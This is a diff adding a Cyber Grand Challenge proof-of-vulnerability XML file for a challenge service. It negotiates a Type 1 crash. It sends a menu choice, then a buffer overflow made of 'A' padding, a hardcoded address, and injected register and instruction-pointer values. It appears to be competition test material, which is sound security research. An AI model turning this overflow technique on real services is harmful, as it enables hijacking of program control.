@@ -1,0 +1,17 @@
+<?xml version="1.0" standalone="no" ?>
+<!DOCTYPE cfepov SYSTEM "/usr/share/cgc-docs/cfe-pov.dtd">
+<cfepov>
+<cbid>service</cbid>
+<replay>
+    <negotiate><type1><ipmask>0xffffffff</ipmask><regmask>0xffffffff</regmask><regnum>6</regnum></type1></negotiate>
+    <read echo="yes"><length>38</length></read>
+    <write><data>1\x0a</data></write>
+    <read echo="yes"><length>12</length></read>
+    <write><data>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd0\xae\xaa\xba</data>
+           <var>TYPE1_REG</var>
+           <data>BBBB</data>
+           <var>TYPE1_IP</var>
+           <data>BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\x0a</data></write>
+</replay>
+</cfepov>
+
